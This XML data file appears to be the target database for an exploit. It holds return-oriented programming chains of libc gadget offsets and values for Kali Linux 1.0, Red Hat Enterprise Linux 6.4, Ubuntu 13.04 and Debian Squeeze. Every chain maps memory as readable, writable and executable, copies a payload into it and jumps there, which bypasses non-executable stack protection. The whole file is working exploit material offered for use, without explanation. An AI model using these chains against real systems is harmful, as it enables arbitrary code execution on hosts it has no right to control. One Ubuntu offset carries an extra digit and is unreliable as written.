<?xml version="1.0" encoding="ISO-8859-1"?>
<db>
    <rop>
        <compatibility>
            <target>Kali Linux 1.0</target>
        </compatibility>

        <!--
        dpkg -l libc-* ii  libc-bin 2.13-38 i386 Embedded GNU C Library: Binaries
        b7533000-b768f000 r-xp 00000000 08:01 1311258    /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
        b7692000-b7693000 rw-p 0015e000 08:01 1311258    /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
        -->

        <gadgets base="0">
            <gadget offset="0x00001aa6">pop edx</gadget>
            <gadget value ="0x080c429c">mmap64.plt</gadget>
            <gadget offset="0x00078b14">xor eax, eax</gadget>
            <gadget offset="0x0011d795">add eax ecx ; pop ebx ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
            <gadget offset="0x000d5c5a">sub eax, 1</gadget>
            <gadget offset="0x0002a137">mov [eax], ecx</gadget>
            <gadget offset="0x00003689">xchg ebp, eax</gadget>
            <gadget offset="0x00078b14">xor eax, eax</gadget>
            <gadget offset="0x0011d795">add eax ecx ; pop ebx ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x0006efb0">mov eax [edx] ; mov [ecx] eax ; pop ebp</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00125ec9">call eax ; pop ebx ; pop ebp</gadget>
            <gadget value ="0x00000000">addr</gadget>
            <gadget value ="0x00000800">payload size</gadget>
            <gadget offset="0x000eb9f7">add esp 0x10 ; pop ebx ; pop ebp ;; (Also flags: PROT_READ | PROT_WRITE | PROT_EXEC)</gadget>
            <gadget value ="0x00000022">MAP_PRIVATE | MAP_ANON</gadget>
            <gadget value ="0xffffffff">filedes</gadget>
            <gadget value ="0x00000000">off_t</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00103dbe">push esp ; pop ebx ; pop esi ; pop edi ; pop ebp</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x000ab68d">xchg ebx eax ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x000f66ad">add eax 0xc ;;</gadget>
            <gadget offset="0x0007fa9c">add eax 0x8 ;;</gadget>
            <gadget offset="0x000b0edc">push eax ; xor eax eax ; pop esi ; pop ebp ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x000ab68d">xchg ebx eax ;;</gadget>
            <gadget offset="0x000c9325">xchg edi eax ;;</gadget>
            <gadget offset="0x000e2c02">pop ecx ; pop edx ;;</gadget>
            <gadget value ="0x00000200">payload size (in dwords)</gadget>
            <gadget value ="0x00000000">garbage</gadget>
            <gadget offset="0x0007a35c">rep movsd ; xchg edi eax ; mov esi edx ;; </gadget>
            <gadget offset="0x0002a6eb">pop ecx, pop edx</gadget>
            <gadget value ="0x00000800">payload size</gadget>
            <gadget value ="0x00000000">garbage</gadget>
            <gadget offset="0x00121fd8">sub eax, ecx</gadget>
            <gadget offset="0x000e2abb">call eax ; pop ebx ; pop ebp ;;</gadget>
	   </gadgets>
    </rop>

    <rop>
        <compatibility>
            <target>Red Hat Enterprise Linux 6.4</target>
        </compatibility>

        <!--
        rpm -qa | grep libc- glibc-2.12-1.107.el6.i686
        001a1000-00335000 r-xp 00000000 ca:41 14763      /lib/i686/nosegneg/libc-2.12.so
        00337000-00338000 rw-p 00196000 ca:41 14763      /lib/i686/nosegneg/libc-2.12.so
        -->

        <gadgets base="0">
            <gadget offset="0x00001aa6">pop edx</gadget>
            <gadget value ="0x080b42d4">mmap64</gadget>
            <gadget offset="0x0007a414">xor eax, eax</gadget>
            <gadget offset="0x00139aa0">add eax ecx ; pop ebx ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x000e57ca">sub eax, 1</gadget>
            <gadget offset="0x000e57ca">sub eax, 1</gadget>
            <gadget offset="0x000e57ca">sub eax, 1</gadget>
            <gadget offset="0x000e57ca">sub eax, 1</gadget>
            <gadget offset="0x0002a4e7">mov [eax], ecx</gadget>
            <gadget offset="0x00003671">xchg ebp, eax</gadget>
            <gadget offset="0x0007a414">xor eax, eax</gadget>
            <gadget offset="0x00139aa0">add eax ecx ; pop ebx ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x0006fc30">mov eax [edx] ; mov [ecx] eax ; pop ebp</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00145519">call eax ; pop ebx ; pop ebp</gadget>
            <gadget value ="0x00000000">addr</gadget>
            <gadget value ="0x00000800">payload size</gadget>
            <gadget offset="0x000a0677">add esp 0x20 ; pop ebx ; pop ebp ;; (Also flags: PROT_READ | PROT_WRITE | PROT_EXEC)</gadget>
            <gadget value ="0x00000022">MAP_PRIVATE | MAP_ANON</gadget>
            <gadget value ="0xffffffff">filedes</gadget>
            <gadget value ="0x00000000">off_t</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x000bc833">push esp ; pop ebx ; pop esi ; pop edi ; pop ebp</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00168d09">xchg ebx eax ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b2c">add eax 0xc ;;</gadget>
            <gadget offset="0x00081b1c">add eax 0x8 ;;</gadget>
            <gadget offset="0x000b00cc">push eax ; xor eax eax ; pop esi ; pop ebp ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00168d09">xchg ebx eax ;;</gadget>
            <gadget offset="0x0016d283">xchg edi eax ;;</gadget>
            <gadget offset="0x0002aacb">pop ecx ; pop edx ;;</gadget>
            <gadget value ="0x00000200">payload size (in dwords)</gadget>
            <gadget value ="0x00000000">garbage</gadget>
            <gadget offset="0x0007bd3c">rep movsd ; xchg edi eax ; mov esi edx ;; </gadget>
            <gadget offset="0x0002aacb">pop ecx ; pop edx ;;</gadget>
            <gadget value ="0x00000800">payload size</gadget>
            <gadget value ="0x00000000">garbage</gadget>
            <gadget offset="0x00141218">sub eax, ecx</gadget>
            <gadget offset="0x000f59fb">call eax ; pop ebx ; pop ebp ;;</gadget>
        </gadgets>
    </rop>

    <rop>
        <compatibility>
            <target>Ubuntu 13.04</target>
        </compatibility>

        <!--
        dpkg -l | grep libc-* ii  libc-bin 2.17-0ubuntu5 i386 Embedded GNU C Library: Binaries
        b7573000-b7720000 r-xp 00000000 08:01 917528     /lib/i386-linux-gnu/libc-2.17.so
        b7722000-b7723000 rw-p 001af000 08:01 917528     /lib/i386-linux-gnu/libc-2.17.so
        -->

        <gadgets base="0">
            <gadget offset="0x00001aa6">pop edx</gadget>
            <gadget value ="0x080c5188">mmap64</gadget>
            <gadget offset="0x0002fa17">xor eax, eax</gadget>
            <gadget offset="0x0013b978">add eax ecx ; pop ebx ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00083ad1">sub eax, 1</gadget>
            <gadget offset="0x00083ad1">sub eax, 1</gadget>
            <gadget offset="0x00083ad1">sub eax, 1</gadget>
            <gadget offset="0x00083ad1">sub eax, 1</gadget>
            <gadget offset="0x0002e09f">mov [eax], ecx</gadget>
            <gadget offset="0x00003729">xchg ebp, eax</gadget>
            <gadget offset="0x00002fa17">xor eax, eax</gadget>
            <gadget offset="0x0013b978">add eax ecx ; pop ebx ;;</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x0012b870">mov eax [edx] ; add esp 0xc</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x000edea4">call eax ; add esp 0x28 ; pop ebx</gadget>
            <gadget value ="0x00000000">addr</gadget>
            <gadget value ="0x00000800">payload size</gadget>
            <gadget value ="0x00000007">PROT_READ | PROT_WRITE | PROT_EXEC</gadget>
            <gadget value ="0x00000022">MAP_PRIVATE | MAP_ANON</gadget>
            <gadget value ="0xffffffff">filedes</gadget>
            <gadget value ="0x00000000">off_t</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
            <gadget offset="0x00115bc5">push esp ; pop ebx ; pop esi</gadget>
            <gadget value ="0x00000000">Garbage</gadget>
	        <gadget offset="0x0007fedd">mov edi eax ; mov esi edx ; mov eax [esp+0x4]</gadget>
            <gadget offset="0x000f15e4">xchg ebx ecx</gadget>
            <gadget offset="0x0014eb83">mov eax ecx</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
            <gadget offset="0x00113988">add eax 0x8 ;;</gadget>
            <gadget offset="0x000ceb8c">push eax ; xor eax eax ; pop esi</gadget>
            <gadget offset="0x0002e8bb">pop ecx ; pop edx ;;</gadget>
            <gadget value ="0x00000200">payload size (in dwords)</gadget>
            <gadget value ="0x00000000">garbage</gadget>
            <gadget offset="0x0007f8fc">rep movsd ; xchg edi eax ; mov esi edx ;; </gadget>
            <gadget offset="0x0002e8bb">pop ecx ; pop edx ;;</gadget>
            <gadget value ="0x00000800">payload size</gadget>
            <gadget value ="0x00000000">garbage</gadget>
            <gadget offset="0x00145528">sub eax, ecx</gadget>
            <gadget offset="0x0007ec86">call eax</gadget>

        </gadgets>
    </rop>

    <rop>
        <compatibility>
            <target>Debian Squeeze</target>
        </compatibility>

        <!--
        dpkg -l | grep libc*  ii libc-bin 2.11.3-4 Embedded GNU C Library: Binaries
        b75f5000-b7735000 r-xp 00000000 08:01 157287     /lib/i686/cmov/libc-2.11.3.so
        b7738000-b7739000 rw-p 00142000 08:01 157287     /lib/i686/cmov/libc-2.11.3.so
        -->

        <gadgets base="0">
            <!-- mmap rwx memory -->
            <gadget value ="0x0804a210">mmap64@plt</gadget>
            <gadget offset="0x000b744b">add esp 0x1c ; leave</gadget>
            <gadget value ="0x31337000">map destination</gadget>
            <gadget value ="0x00001000">size</gadget>
            <gadget value ="0x00000007">PROT_READ | PROT_WRITE | PROT_EXEC</gadget>
            <gadget value ="0x00000031">MAP_PRIVATE | MAP_ANON | MAP_FIXED</gadget>
            <gadget value ="0xffffffff">fildes</gadget>
            <gadget value ="0x00000000">offset</gadget>
            <gadget value ="0x00000000"></gadget>
            <gadget value ="0xffffffff">garbage</gadget>

            <!-- put stack location in eax and adjust it to point to src param for memcpy -->
            <gadget offset="0x000c2bc7">push esp ; xor eax, eax ; pop ebx ; pop ebp</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget offset="0x000cc3f6">xchg ecx, ebx ; pop ebp</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget offset="0x000709e0">mov edi, ecx ; mov eax, edi ; pop edi ; pop ebp</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget value ="0x0000004c">add to eax</gadget>
            <gadget offset="0x000658e7">add eax, ebp</gadget>

            <!-- move original stack location in [eax] -->
            <gadget offset="0x0007487d">mov edi, eax ; mov esi, edx ; mov eax, [esp+4]</gadget>
            <gadget offset="0x000c4262">mov eax, ecx ; pop ebx ; pop ebp</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget offset="0x0002c528">mov [edi], eax ; pop eax ; pop ebx ; pop esi ; pop edi</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget value ="0xffffffff">garbage</gadget>
            <gadget value ="0xffffffff">garbage</gadget>

            <!-- call memcpy and return into payload -->
            <gadget value ="0x08049f10">memcpy@plt</gadget>
            <gadget value ="0x31337054">return into payload</gadget>
            <gadget value ="0x31337000">dest</gadget>
            <gadget value ="0xffffffff">src (overwritten by stack location)</gadget>
            <gadget value ="0x00001000">size</gadget>

        </gadgets>
    </rop>


</db>
